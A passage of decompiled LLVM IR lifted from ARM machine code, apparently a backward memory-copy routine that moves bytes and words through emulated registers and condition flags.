  %v0_1aab8.pr = phi i32 [ %v2_1aaa0, %dec_label_pc_1aaa8.loopexit ], [ %v2_1aa88, %dec_label_pc_1aa84 ]
  %v4_1aaa8 = add i32 %v0_1aab8.pr, 16
  %v6_1aaa8 = sub i32 0, %v0_1aab8.pr
  %v7_1aaa8 = and i32 %v4_1aaa8, %v6_1aaa8
  %v8_1aaa8 = icmp slt i32 %v7_1aaa8, 0
  store i1 %v8_1aaa8, i1* %cpsr_v.global-to-local, align 1
  %v9_1aaa8 = icmp slt i32 %v4_1aaa8, 0
  store i1 %v9_1aaa8, i1* %cpsr_n.global-to-local, align 1
  %v5_1aaac = icmp slt i32 %v0_1aab8.pr, -16
  br i1 %v5_1aaac, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_1aaa8
  %v6_1aaac = load i32, i32* %r1.global-to-local, align 4
  %v7_1aaac = add i32 %v6_1aaac, -4
  %v8_1aaac = inttoptr i32 %v7_1aaac to i32*
  %v9_1aaac = load i32, i32* %v8_1aaac, align 4
  store i32 %v9_1aaac, i32* @r3, align 4
  %v10_1aaac = add i32 %v6_1aaac, -8
  %v11_1aaac = inttoptr i32 %v10_1aaac to i32*
  %v12_1aaac = load i32, i32* %v11_1aaac, align 4
  store i32 %v12_1aaac, i32* %r4.global-to-local, align 4
  %v13_1aaac = add i32 %v6_1aaac, -12
  %v14_1aaac = inttoptr i32 %v13_1aaac to i32*
  %v15_1aaac = load i32, i32* %v14_1aaac, align 4
  store i32 %v15_1aaac, i32* @ip, align 4
  %v16_1aaac = add i32 %v6_1aaac, -16
  %v17_1aaac = inttoptr i32 %v16_1aaac to i32*
  %v18_1aaac = load i32, i32* %v17_1aaac, align 4
  store i32 %v18_1aaac, i32* %lr.global-to-local, align 4
  store i32 %v16_1aaac, i32* %r1.global-to-local, align 4
  %v7_1aab0 = add i32 %v6_1aab0, -16
  %v8_1aab0 = inttoptr i32 %v7_1aab0 to i32*
  store i32 %v9_1aaac, i32* %v8_1aab0, align 4
  %v10_1aab0 = add i32 %v6_1aab0, -12
  %v11_1aab0 = inttoptr i32 %v10_1aab0 to i32*
  %v12_1aab0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_1aab0, i32* %v11_1aab0, align 4
  %v13_1aab0 = add i32 %v6_1aab0, -8
  %v14_1aab0 = inttoptr i32 %v13_1aab0 to i32*
  %v15_1aab0 = load i32, i32* @ip, align 4
  store i32 %v15_1aab0, i32* %v14_1aab0, align 4
  %v16_1aab0 = add i32 %v6_1aab0, -4
  %v17_1aab0 = inttoptr i32 %v16_1aab0 to i32*
  %v18_1aab0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_1aab0, i32* %v17_1aab0, align 4
  store i32 %v7_1aab0, i32* %r0.global-to-local, align 4
  %v6_1aab4 = load i32, i32* %r2.global-to-local, align 4
  %v7_1aab4 = add i32 %v6_1aab4, -16
  store i32 %v7_1aab4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1aaa8, %bb140
  %v6_1aac0 = phi i32 [ %v7_1aab0, %bb140 ], [ %v6_1aab0, %dec_label_pc_1aaa8 ]
  %v0_1aab8 = phi i32 [ %v7_1aab4, %bb140 ], [ %v0_1aab8.pr, %dec_label_pc_1aaa8 ]
  %v4_1aab8 = add i32 %v0_1aab8, 20
  store i32 %v4_1aab8, i32* %r2.global-to-local, align 4
  %v6_1aab8 = sub i32 0, %v0_1aab8
  %v7_1aab8 = and i32 %v4_1aab8, %v6_1aab8
  %v8_1aab8 = icmp slt i32 %v7_1aab8, 0
  store i1 %v8_1aab8, i1* %cpsr_v.global-to-local, align 1
  %v9_1aab8 = icmp slt i32 %v4_1aab8, 0
  store i1 %v9_1aab8, i1* %cpsr_n.global-to-local, align 1
  %v5_1aabc = icmp slt i32 %v0_1aab8, -20
  br i1 %v5_1aabc, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_1aabc = load i32, i32* %r1.global-to-local, align 4
  %v7_1aabc = add i32 %v6_1aabc, -4
  %v8_1aabc = inttoptr i32 %v7_1aabc to i32*
  %v9_1aabc = load i32, i32* %v8_1aabc, align 4
  store i32 %v9_1aabc, i32* @r3, align 4
  %v10_1aabc = add i32 %v6_1aabc, -8
  %v11_1aabc = inttoptr i32 %v10_1aabc to i32*
  %v12_1aabc = load i32, i32* %v11_1aabc, align 4
  store i32 %v12_1aabc, i32* @ip, align 4
  %v13_1aabc = add i32 %v6_1aabc, -12
  %v14_1aabc = inttoptr i32 %v13_1aabc to i32*
  %v15_1aabc = load i32, i32* %v14_1aabc, align 4
  store i32 %v15_1aabc, i32* %lr.global-to-local, align 4
  store i32 %v13_1aabc, i32* %r1.global-to-local, align 4
  %v7_1aac0 = add i32 %v6_1aac0, -12
  %v8_1aac0 = inttoptr i32 %v7_1aac0 to i32*
  store i32 %v9_1aabc, i32* %v8_1aac0, align 4
  %v10_1aac0 = add i32 %v6_1aac0, -8
  %v11_1aac0 = inttoptr i32 %v10_1aac0 to i32*
  %v12_1aac0 = load i32, i32* @ip, align 4
  store i32 %v12_1aac0, i32* %v11_1aac0, align 4
  %v13_1aac0 = add i32 %v6_1aac0, -4
  %v14_1aac0 = inttoptr i32 %v13_1aac0 to i32*
  %v15_1aac0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_1aac0, i32* %v14_1aac0, align 4
  store i32 %v7_1aac0, i32* %r0.global-to-local, align 4
  %v6_1aac4 = load i32, i32* %r2.global-to-local, align 4
  %v7_1aac4 = add i32 %v6_1aac4, -12
  store i32 %v7_1aac4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_1aae457 = phi i32 [ %v6_1aac0, %.thread14 ], [ %v7_1aac0, %bb141 ]
  %v0_1aacc55 = phi i32 [ %v4_1aab8, %.thread14 ], [ %v7_1aac4, %bb141 ]
  %v2_1aac8 = load i8*, i8** %stack_var_-8, align 4
  %v3_1aac8 = ptrtoint i8* %v2_1aac8 to i32
  store i32 %v3_1aac8, i32* @r4, align 4
  store i32 %v8_1aa84, i32* @lr, align 4
  br label %dec_label_pc_1aacc

dec_label_pc_1aacc:                               ; preds = %dec_label_pc_1aa7c, %.thread16
  %v7_1aadc = phi i32 [ %v0_1aa9449, %dec_label_pc_1aa7c ], [ %v6_1aae457, %.thread16 ]
  %v0_1aacc = phi i32 [ %v2_1aa7c, %dec_label_pc_1aa7c ], [ %v0_1aacc55, %.thread16 ]
  %v2_1aacc = add i32 %v0_1aacc, 8
  store i32 %v2_1aacc, i32* %r2.global-to-local, align 4
  %v4_1aacc = sub i32 0, %v0_1aacc
  %v5_1aacc = and i32 %v2_1aacc, %v4_1aacc
  %v6_1aacc = icmp slt i32 %v5_1aacc, 0
  store i1 %v6_1aacc, i1* %cpsr_v.global-to-local, align 1
  %v7_1aacc = icmp slt i32 %v2_1aacc, 0
  store i1 %v7_1aacc, i1* %cpsr_n.global-to-local, align 1
  %v5_1aad0 = icmp slt i32 %v0_1aacc, -8
  br i1 %v5_1aad0, label %bb143, label %dec_label_pc_1aad4

dec_label_pc_1aad4:                               ; preds = %dec_label_pc_1aacc
  %v6_1aad4 = add i32 %v0_1aacc, 4
  store i32 %v6_1aad4, i32* %r2.global-to-local, align 4
  %v8_1aad4 = sub i32 -5, %v0_1aacc
  %v9_1aad4 = and i32 %v8_1aad4, %v2_1aacc
  %v10_1aad4 = icmp slt i32 %v9_1aad4, 0
  store i1 %v10_1aad4, i1* %cpsr_v.global-to-local, align 1
  %v11_1aad4 = icmp slt i32 %v6_1aad4, 0
  store i1 %v11_1aad4, i1* %cpsr_n.global-to-local, align 1
  %v5_1aad8 = icmp slt i32 %v2_1aacc, 4
  %v6_1aad8 = load i32, i32* %r1.global-to-local, align 4
  %v7_1aad8 = add i32 %v6_1aad8, -4
  %v8_1aad8 = inttoptr i32 %v7_1aad8 to i32*
  %v9_1aad8 = load i32, i32* %v8_1aad8, align 4
  store i32 %v9_1aad8, i32* @r3, align 4
  br i1 %v5_1aad8, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_1aad4
  store i32 %v7_1aad8, i32* %r1.global-to-local, align 4
  %v8_1aadc = add i32 %v7_1aadc, -4
  %v9_1aadc = inttoptr i32 %v8_1aadc to i32*
  store i32 %v9_1aad8, i32* %v9_1aadc, align 4
  %v10_1aadc = load i32, i32* %r0.global-to-local, align 4
  %v11_1aadc = add i32 %v10_1aadc, -4
  store i32 %v11_1aadc, i32* %r0.global-to-local, align 4
  %v0_1aaec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_1aad4
  %v10_1aae0 = add i32 %v6_1aad8, -8
  %v11_1aae0 = inttoptr i32 %v10_1aae0 to i32*
  %v12_1aae0 = load i32, i32* %v11_1aae0, align 4
  store i32 %v12_1aae0, i32* @ip, align 4
  store i32 %v10_1aae0, i32* %r1.global-to-local, align 4
  %v7_1aae4 = add i32 %v7_1aadc, -8
  %v8_1aae4 = inttoptr i32 %v7_1aae4 to i32*
  store i32 %v9_1aad8, i32* %v8_1aae4, align 4
  %v10_1aae4 = add i32 %v7_1aadc, -4
  %v11_1aae4 = inttoptr i32 %v10_1aae4 to i32*
  %v12_1aae4 = load i32, i32* @ip, align 4
  store i32 %v12_1aae4, i32* %v11_1aae4, align 4
  store i32 %v7_1aae4, i32* %r0.global-to-local, align 4
  %v6_1aae8 = load i32, i32* %r2.global-to-local, align 4
  %v7_1aae8 = add i32 %v6_1aae8, -4
  store i32 %v7_1aae8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_1aacc, %dec_label_pc_1aa5c, %dec_label_pc_1ac90, %dec_label_pc_1ac24, %dec_label_pc_1abb8, %bb142
  %v2_1aaf0 = phi i32 [ %v11_1aadc, %.thread20 ], [ %v0_1ab8832, %.thread26 ], [ %v7_1aadc, %dec_label_pc_1aacc ], [ %v2_1aa60, %dec_label_pc_1aa5c ], [ %v2_1aafc65, %dec_label_pc_1ac90 ], [ %v2_1aafc64, %dec_label_pc_1ac24 ], [ %v2_1aafc63, %dec_label_pc_1abb8 ], [ %v7_1aae4, %bb142 ]
  %v0_1aaec = phi i32 [ %v0_1aaec.pre, %.thread20 ], [ %v2_1ab30, %.thread26 ], [ %v2_1aacc, %dec_label_pc_1aacc ], [ %v2_1aa64, %dec_label_pc_1aa5c ], [ %v0_1aaec61, %dec_label_pc_1ac90 ], [ %v0_1aaec60, %dec_label_pc_1ac24 ], [ %v0_1aaec59, %dec_label_pc_1abb8 ], [ %v7_1aae8, %bb142 ]
  %v1_1aaec = add i32 %v0_1aaec, 4
  store i32 %v1_1aaec, i32* @r2, align 4
  %v3_1aaec = sub i32 0, %v0_1aaec
  %v4_1aaec = and i32 %v1_1aaec, %v3_1aaec
  %v5_1aaec = icmp slt i32 %v4_1aaec, 0
  store i1 %v5_1aaec, i1* %cpsr_v.global-to-local, align 1
  %v6_1aaec = icmp slt i32 %v1_1aaec, 0
  store i1 %v6_1aaec, i1* %cpsr_n.global-to-local, align 1
  %v7_1aaec = icmp eq i32 %v1_1aaec, 0
  store i1 %v7_1aaec, i1* @cpsr_z, align 1
  br i1 %v7_1aaec, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_1aaf4 = add i32 %v0_1aaec, 2
  %v3_1aaf4 = sub i32 -3, %v0_1aaec
  %v4_1aaf4 = and i32 %v3_1aaf4, %v1_1aaec
  %v5_1aaf4 = icmp slt i32 %v4_1aaf4, 0
  store i1 %v5_1aaf4, i1* %cpsr_v.global-to-local, align 1
  %v6_1aaf4 = icmp slt i32 %v1_1aaf4, 0
  store i1 %v6_1aaf4, i1* %cpsr_n.global-to-local, align 1
  %v7_1aaf4 = icmp eq i32 %v1_1aaec, 2
  store i1 %v7_1aaf4, i1* @cpsr_z, align 1
  %v0_1aaf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aaf8 = add i32 %v0_1aaf8, -1
  %v2_1aaf8 = inttoptr i32 %v1_1aaf8 to i8*
  %v3_1aaf8 = load i8, i8* %v2_1aaf8, align 1
  %v4_1aaf8 = zext i8 %v3_1aaf8 to i32
  store i32 %v4_1aaf8, i32* @r3, align 4
  store i32 %v1_1aaf8, i32* %r1.global-to-local, align 4
  %v3_1aafc = add i32 %v2_1aaf0, -1
  %v4_1aafc = inttoptr i32 %v3_1aafc to i8*
  store i8 %v3_1aaf8, i8* %v4_1aafc, align 1
  %v5_1aafc = load i32, i32* %r0.global-to-local, align 4
  %v6_1aafc = add i32 %v5_1aafc, -1
  store i32 %v6_1aafc, i32* %r0.global-to-local, align 4
  %v0_1ab00 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1ab00 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1ab00 = xor i1 %v0_1ab00, %v1_1ab00
  br i1 %v2_1ab00, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_1ab00 = load i32, i32* %r1.global-to-local, align 4
  %v4_1ab00 = add i32 %v3_1ab00, -1
  %v5_1ab00 = inttoptr i32 %v4_1ab00 to i8*
  %v6_1ab00 = load i8, i8* %v5_1ab00, align 1
  %v7_1ab00 = zext i8 %v6_1ab00 to i32
  store i32 %v7_1ab00, i32* @r3, align 4
  store i32 %v4_1ab00, i32* %r1.global-to-local, align 4
  %v6_1ab04 = add i32 %v5_1aafc, -2
  %v7_1ab04 = inttoptr i32 %v6_1ab04 to i8*
  store i8 %v6_1ab00, i8* %v7_1ab04, align 1
  %v8_1ab04 = load i32, i32* %r0.global-to-local, align 4
  %v9_1ab04 = add i32 %v8_1ab04, -1
  store i32 %v9_1ab04, i32* %r0.global-to-local, align 4
  %v1_1ab08.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab08.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_1ab0c = phi i32 [ %v9_1ab04, %bb145 ], [ %v6_1aafc, %bb144 ]
  %v2_1ab0c = phi i1 [ %v2_1ab08.pre, %bb145 ], [ %v1_1ab00, %bb144 ]
  %v1_1ab0c = phi i1 [ %v1_1ab08.pre, %bb145 ], [ %v0_1ab00, %bb144 ]
  %v0_1ab08 = load i1, i1* @cpsr_z, align 1
  %v3_1ab08 = xor i1 %v2_1ab0c, %v1_1ab0c
  %v4_1ab08 = or i1 %v0_1ab08, %v3_1ab08
  br i1 %v4_1ab08, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_1ab08 = load i32, i32* %r1.global-to-local, align 4
  %v6_1ab08 = add i32 %v5_1ab08, -1
  %v7_1ab08 = inttoptr i32 %v6_1ab08 to i8*
  %v8_1ab08 = load i8, i8* %v7_1ab08, align 1
  %v9_1ab08 = zext i8 %v8_1ab08 to i32
  store i32 %v9_1ab08, i32* @r3, align 4
  store i32 %v6_1ab08, i32* %r1.global-to-local, align 4
  %v8_1ab0c = add i32 %v7_1ab0c, -1
  %v9_1ab0c = inttoptr i32 %v8_1ab0c to i8*
  store i8 %v8_1ab08, i8* %v9_1ab0c, align 1
  %v10_1ab0c = load i32, i32* %r0.global-to-local, align 4
  %v11_1ab0c = add i32 %v10_1ab0c, -1
  store i32 %v11_1ab0c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_1ab14:                               ; preds = %dec_label_pc_1aa6c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1ab14 = icmp eq i32 %v1_1aa6c, 1
  store i1 %v8_1ab14, i1* %cpsr_n.global-to-local, align 1
  %v1_1ab18 = add i32 %v2_1aa5c, -1
  %v2_1ab18 = inttoptr i32 %v1_1ab18 to i8*
  %v3_1ab18 = load i8, i8* %v2_1ab18, align 1
  %v4_1ab18 = zext i8 %v3_1ab18 to i32
  store i32 %v4_1ab18, i32* @r3, align 4
  store i32 %v1_1ab18, i32* %r1.global-to-local, align 4
  %v3_1ab1c = add i32 %v2_1aa60, -1
  %v4_1ab1c = inttoptr i32 %v3_1ab1c to i8*
  store i8 %v3_1ab18, i8* %v4_1ab1c, align 1
  %v5_1ab1c = load i32, i32* %r0.global-to-local, align 4
  %v6_1ab1c = add i32 %v5_1ab1c, -1
  store i32 %v6_1ab1c, i32* %r0.global-to-local, align 4
  br i1 %v8_1ab14, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_1ab14
  %v9_1ab14 = icmp eq i32 %v1_1aa6c, 2
  %v6_1ab20 = load i32, i32* %r1.global-to-local, align 4
  %v7_1ab20 = add i32 %v6_1ab20, -1
  %v8_1ab20 = inttoptr i32 %v7_1ab20 to i8*
  %v9_1ab20 = load i8, i8* %v8_1ab20, align 1
  %v10_1ab20 = zext i8 %v9_1ab20 to i32
  store i32 %v10_1ab20, i32* @r3, align 4
  store i32 %v7_1ab20, i32* %r1.global-to-local, align 4
  %v9_1ab24 = add i32 %v5_1ab1c, -2
  %v10_1ab24 = inttoptr i32 %v9_1ab24 to i8*
  store i8 %v9_1ab20, i8* %v10_1ab24, align 1
  %v11_1ab24 = load i32, i32* %r0.global-to-local, align 4
  %v12_1ab24 = add i32 %v11_1ab24, -1
  store i32 %v12_1ab24, i32* %r0.global-to-local, align 4
  br i1 %v9_1ab14, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_1ab28 = load i32, i32* %r1.global-to-local, align 4
  %v9_1ab28 = add i32 %v8_1ab28, -1
  %v10_1ab28 = inttoptr i32 %v9_1ab28 to i8*
  %v11_1ab28 = load i8, i8* %v10_1ab28, align 1
  %v12_1ab28 = zext i8 %v11_1ab28 to i32
  store i32 %v12_1ab28, i32* @r3, align 4
  store i32 %v9_1ab28, i32* %r1.global-to-local, align 4
  %v11_1ab2c = add i32 %v11_1ab24, -2
  %v12_1ab2c = inttoptr i32 %v11_1ab2c to i8*
  store i8 %v11_1ab28, i8* %v12_1ab2c, align 1
  %v13_1ab2c = load i32, i32* %r0.global-to-local, align 4
  %v14_1ab2c = add i32 %v13_1ab2c, -1
  store i32 %v14_1ab2c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_1ab14, %bb148
  %v0_1ab8832 = phi i32 [ %v12_1ab24, %bb147 ], [ %v6_1ab1c, %dec_label_pc_1ab14 ], [ %v14_1ab2c, %bb148 ]
  %v0_1ab30 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ab30 = load i32, i32* @ip, align 4
  %v2_1ab30 = sub i32 %v0_1ab30, %v1_1ab30
  store i32 %v2_1ab30, i32* %r2.global-to-local, align 4
  %v4_1ab30 = xor i32 %v1_1ab30, %v0_1ab30
  %v5_1ab30 = xor i32 %v2_1ab30, %v0_1ab30
  %v6_1ab30 = and i32 %v5_1ab30, %v4_1ab30
  %v7_1ab30 = icmp slt i32 %v6_1ab30, 0
  store i1 %v7_1ab30, i1* %cpsr_v.global-to-local, align 1
  %v8_1ab30 = icmp slt i32 %v2_1ab30, 0
  store i1 %v8_1ab30, i1* %cpsr_n.global-to-local, align 1
  %v5_1ab34 = icmp slt i32 %v0_1ab30, %v1_1ab30
  br i1 %v5_1ab34, label %bb143, label %dec_label_pc_1ab38

dec_label_pc_1ab38:                               ; preds = %.thread26
  %v0_1ab38 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ab38 = urem i32 %v0_1ab38, 4
  store i32 %v1_1ab38, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1ab38 = icmp eq i32 %v1_1ab38, 0
  br i1 %v2_1ab38, label %dec_label_pc_1aa7c, label %dec_label_pc_1ab40

dec_label_pc_1ab40:                               ; preds = %dec_label_pc_1aa74, %dec_label_pc_1ab38
  %v0_1ab8831 = phi i32 [ %v2_1aa60, %dec_label_pc_1aa74 ], [ %v0_1ab8832, %dec_label_pc_1ab38 ]
  %v0_1ac34 = phi i32 [ %v2_1aa64, %dec_label_pc_1aa74 ], [ %v2_1ab30, %dec_label_pc_1ab38 ]
  %v0_1ab40 = phi i32 [ %v2_1aa5c, %dec_label_pc_1aa74 ], [ %v0_1ab38, %dec_label_pc_1ab38 ]
  %v0_1ab48 = phi i32 [ %v1_1aa74, %dec_label_pc_1aa74 ], [ %v1_1ab38, %dec_label_pc_1ab38 ]
  %v1_1ab40 = and i32 %v0_1ab40, -4
  store i32 %v1_1ab40, i32* %r1.global-to-local, align 4
  %v1_1ab44 = inttoptr i32 %v1_1ab40 to i32*
  %v2_1ab44 = load i32, i32* %v1_1ab44, align 4
  store i32 %v2_1ab44, i32* @r3, align 4
  %v7_1ab48 = icmp ult i32 %v0_1ab48, 2
  %v2_1ac2c = add i32 %v0_1ac34, -12
  %v4_1ac2c = sub i32 11, %v0_1ac34
  %v5_1ac2c = and i32 %v4_1ac2c, %v0_1ac34
  %v6_1ac2c = icmp slt i32 %v5_1ac2c, 0
  store i1 %v6_1ac2c, i1* %cpsr_v.global-to-local, align 1
  %v7_1ac2c = icmp slt i32 %v2_1ac2c, 0
  store i1 %v7_1ac2c, i1* %cpsr_n.global-to-local, align 1
  %v5_1ac30 = icmp slt i32 %v0_1ac34, 12
  br i1 %v7_1ab48, label %dec_label_pc_1ac2c, label %dec_label_pc_1ab50

dec_label_pc_1ab50:                               ; preds = %dec_label_pc_1ab40
  %v8_1ab48 = icmp eq i32 %v0_1ab48, 2
  br i1 %v8_1ab48, label %dec_label_pc_1abc0, label %dec_label_pc_1ab54

dec_label_pc_1ab54:                               ; preds = %dec_label_pc_1ab50
  br i1 %v5_1ac30, label %dec_label_pc_1aba0, label %dec_label_pc_1ab5c

dec_label_pc_1ab5c:                               ; preds = %dec_label_pc_1ab54
  store i32 %v2_1ac2c, i32* %r2.global-to-local, align 4
  %v3_1ab60 = load i32, i32* @r4, align 4
  store i32 %v3_1ab60, i32* %stack_var_-12, align 4
  %v6_1ab60 = load i32, i32* @r5, align 4
  %v8_1ab60 = inttoptr i32 %v6_1ab60 to i8*
  store i8* %v8_1ab60, i8** %stack_var_-8, align 4
  %v11_1ab60 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1ab64

dec_label_pc_1ab64:                               ; preds = %dec_label_pc_1ab64.dec_label_pc_1ab64_crit_edge, %dec_label_pc_1ab5c
  %v0_1ab88 = phi i32 [ %v1_1ab88, %dec_label_pc_1ab64.dec_label_pc_1ab64_crit_edge ], [ %v0_1ab8831, %dec_label_pc_1ab5c ]
  %v0_1ab68 = phi i32 [ %v0_1ab68.pre, %dec_label_pc_1ab64.dec_label_pc_1ab64_crit_edge ], [ %v1_1ab40, %dec_label_pc_1ab5c ]
  %v0_1ab64 = phi i32 [ %v0_1ab64.pre, %dec_label_pc_1ab64.dec_label_pc_1ab64_crit_edge ], [ %v2_1ab44, %dec_label_pc_1ab5c ]
  %v3_1ab64 = udiv i32 %v0_1ab64, 256
  store i32 %v3_1ab64, i32* %lr.global-to-local, align 4
  %v1_1ab68 = add i32 %v0_1ab68, -4
  %v2_1ab68 = inttoptr i32 %v1_1ab68 to i32*
  %v3_1ab68 = load i32, i32* %v2_1ab68, align 4
  store i32 %v3_1ab68, i32* @r3, align 4
  %v4_1ab68 = add i32 %v0_1ab68, -8
  %v5_1ab68 = inttoptr i32 %v4_1ab68 to i32*
  %v6_1ab68 = load i32, i32* %v5_1ab68, align 4
  store i32 %v6_1ab68, i32* %r4.global-to-local, align 4
  %v7_1ab68 = add i32 %v0_1ab68, -12
  %v8_1ab68 = inttoptr i32 %v7_1ab68 to i32*
  %v9_1ab68 = load i32, i32* %v8_1ab68, align 4
  store i32 %v9_1ab68, i32* %r5.global-to-local, align 4
  %v10_1ab68 = add i32 %v0_1ab68, -16
  %v11_1ab68 = inttoptr i32 %v10_1ab68 to i32*
  %v12_1ab68 = load i32, i32* %v11_1ab68, align 4
  store i32 %v10_1ab68, i32* %r1.global-to-local, align 4
  %v4_1ab6c = mul i32 %v12_1ab68, 16777216
  %v5_1ab6c = or i32 %v4_1ab6c, %v3_1ab64
  store i32 %v5_1ab6c, i32* %lr.global-to-local, align 4
  %v3_1ab70 = udiv i32 %v12_1ab68, 256
  %v4_1ab74 = mul i32 %v9_1ab68, 16777216
  %v5_1ab74 = or i32 %v3_1ab70, %v4_1ab74
  store i32 %v5_1ab74, i32* @ip, align 4
  %v3_1ab78 = udiv i32 %v9_1ab68, 256
  %v4_1ab7c = mul i32 %v6_1ab68, 16777216
  %v5_1ab7c = or i32 %v3_1ab78, %v4_1ab7c
  store i32 %v5_1ab7c, i32* %r5.global-to-local, align 4
  %v3_1ab80 = udiv i32 %v6_1ab68, 256
  %v4_1ab84 = mul i32 %v3_1ab68, 16777216
  %v5_1ab84 = or i32 %v3_1ab80, %v4_1ab84
  store i32 %v5_1ab84, i32* %r4.global-to-local, align 4
  %v1_1ab88 = add i32 %v0_1ab88, -16
  %v2_1ab88 = inttoptr i32 %v1_1ab88 to i32*
  store i32 %v5_1ab84, i32* %v2_1ab88, align 4
  %v4_1ab88 = add i32 %v0_1ab88, -12
  %v5_1ab88 = inttoptr i32 %v4_1ab88 to i32*
  %v6_1ab88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1ab88, i32* %v5_1ab88, align 4
  %v7_1ab88 = add i32 %v0_1ab88, -8
  %v8_1ab88 = inttoptr i32 %v7_1ab88 to i32*
  %v9_1ab88 = load i32, i32* @ip, align 4
  store i32 %v9_1ab88, i32* %v8_1ab88, align 4
  %v10_1ab88 = add i32 %v0_1ab88, -4
  %v11_1ab88 = inttoptr i32 %v10_1ab88 to i32*
  %v12_1ab88 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1ab88, i32* %v11_1ab88, align 4
  store i32 %v1_1ab88, i32* %r0.global-to-local, align 4
  %v0_1ab8c = load i32, i32* %r2.global-to-local, align 4
  %v2_1ab8c = add i32 %v0_1ab8c, -16
  store i32 %v2_1ab8c, i32* %r2.global-to-local, align 4
  %v6_1ab90 = icmp slt i32 %v0_1ab8c, 16
  br i1 %v6_1ab90, label %dec_label_pc_1ab94, label %dec_label_pc_1ab64.dec_label_pc_1ab64_crit_edge

dec_label_pc_1ab64.dec_label_pc_1ab64_crit_edge:  ; preds = %dec_label_pc_1ab64
  %v0_1ab64.pre = load i32, i32* @r3, align 4
  %v0_1ab68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ab64

dec_label_pc_1ab94:                               ; preds = %dec_label_pc_1ab64
  %v2_1ab94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ab94, i32* @r4, align 4
  %v5_1ab94 = load i8*, i8** %stack_var_-8, align 4
  %v6_1ab94 = ptrtoint i8* %v5_1ab94 to i32
  store i32 %v6_1ab94, i32* @r5, align 4
  store i32 %v11_1ab60, i32* @lr, align 4
  %v2_1ab98 = add i32 %v0_1ab8c, -4
  store i32 %v2_1ab98, i32* %r2.global-to-local, align 4
  %v4_1ab98 = add i32 %v0_1ab8c, 2147483632
  %v5_1ab98 = and i32 %v2_1ab98, %v4_1ab98
  %v6_1ab98 = icmp slt i32 %v5_1ab98, 0
  store i1 %v6_1ab98, i1* %cpsr_v.global-to-local, align 1
  %v7_1ab98 = icmp slt i32 %v2_1ab98, 0
  store i1 %v7_1ab98, i1* %cpsr_n.global-to-local, align 1
  %v5_1ab9c = icmp slt i32 %v2_1ab8c, -12
  br i1 %v5_1ab9c, label %dec_label_pc_1abb8, label %dec_label_pc_1aba0

dec_label_pc_1aba0:                               ; preds = %dec_label_pc_1ab54, %dec_label_pc_1ab94, %dec_label_pc_1aba0
  %v1_1abac = phi i32 [ %v5_1abac, %dec_label_pc_1aba0 ], [ %v0_1ab8831, %dec_label_pc_1ab54 ], [ %v1_1ab88, %dec_label_pc_1ab94 ]
  %v0_1aba0 = load i32, i32* @r3, align 4
  %v3_1aba0 = udiv i32 %v0_1aba0, 256
  store i32 %v3_1aba0, i32* %ip.global-to-local, align 4
  %v0_1aba4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1aba4 = add i32 %v0_1aba4, -4
  %v2_1aba4 = inttoptr i32 %v1_1aba4 to i32*
  %v3_1aba4 = load i32, i32* %v2_1aba4, align 4
  store i32 %v3_1aba4, i32* @r3, align 4
  store i32 %v1_1aba4, i32* %r1.global-to-local, align 4
  %v4_1aba8 = mul i32 %v3_1aba4, 16777216
  %v5_1aba8 = or i32 %v4_1aba8, %v3_1aba0
  store i32 %v5_1aba8, i32* @ip, align 4
  %v2_1abac = add i32 %v1_1abac, -4
  %v3_1abac = inttoptr i32 %v2_1abac to i32*
  store i32 %v5_1aba8, i32* %v3_1abac, align 4
  %v4_1abac = load i32, i32* %r0.global-to-local, align 4
  %v5_1abac = add i32 %v4_1abac, -4
  store i32 %v5_1abac, i32* %r0.global-to-local, align 4
  %v0_1abb0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1abb0 = add i32 %v0_1abb0, -4
  store i32 %v2_1abb0, i32* %r2.global-to-local, align 4
  %v6_1abb4 = icmp slt i32 %v0_1abb0, 4
  br i1 %v6_1abb4, label %dec_label_pc_1abb8.loopexit, label %dec_label_pc_1aba0

dec_label_pc_1abb8.loopexit:                      ; preds = %dec_label_pc_1aba0
  %v4_1abb0 = sub i32 3, %v0_1abb0
  %v5_1abb0 = and i32 %v4_1abb0, %v0_1abb0
  %v6_1abb0 = icmp slt i32 %v5_1abb0, 0
  %v7_1abb0 = icmp slt i32 %v2_1abb0, 0
  store i1 %v6_1abb0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1abb0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1abb8

